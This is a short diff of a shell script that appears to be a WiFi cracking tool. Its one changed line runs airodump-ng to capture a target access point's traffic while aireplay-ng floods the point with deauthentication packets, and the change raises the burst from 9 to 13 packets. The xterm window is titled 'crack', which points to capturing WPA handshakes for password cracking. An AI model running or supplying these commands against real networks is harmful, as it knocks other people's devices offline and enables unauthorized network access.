@@ -239,7 +239,7 @@ echo [ok]
 rm -r -f lewifi1.txt
 echo
 echo
-xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w $filecap1 $winterface | aireplay-ng -0 9 -a $apbssid $winterface
+xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w $filecap1 $winterface | aireplay-ng -0 13 -a $apbssid $winterface
 echo
 echo
 echo
